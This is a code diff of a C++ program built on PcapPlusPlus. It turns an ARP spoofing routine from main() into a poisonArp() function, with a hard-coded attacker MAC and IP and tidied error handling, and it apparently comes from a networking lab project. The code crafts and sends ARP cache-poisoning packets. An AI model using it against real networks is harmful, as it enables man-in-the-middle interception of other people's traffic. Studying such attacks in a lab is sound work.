@@ -1,4 +1,4 @@
-#include "logger/hello.h"
+#include "core.h"
 #include <ArpLayer.h>
 #include <EthLayer.h>
 #include <IpAddress.h>
@@ -6,8 +6,7 @@
 #include <PcapLiveDeviceList.h>
 #include <cstdio>
 
-int main() {
-  say_hello();
+void poisonArp() {
   pcpp::MacAddress macAttacker("bc:24:11:e3:98:26");
   pcpp::IPv4Address ipAttacker("10.71.2.7");
 
@@ -21,8 +20,8 @@ int main() {
       pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName("ens18");
 
   if (dev == nullptr || !dev->open()) {
-    fprintf(stderr, "cannot open interface");
-    return 1;
+    fprintf(stderr, "cannot open interface\n");
+    exit(1);
   }
 
   // Build ARP spoofing packet
@@ -40,5 +39,4 @@ int main() {
   dev->sendPacket(&packet);
 
   dev->close();
-  return 0;
 }
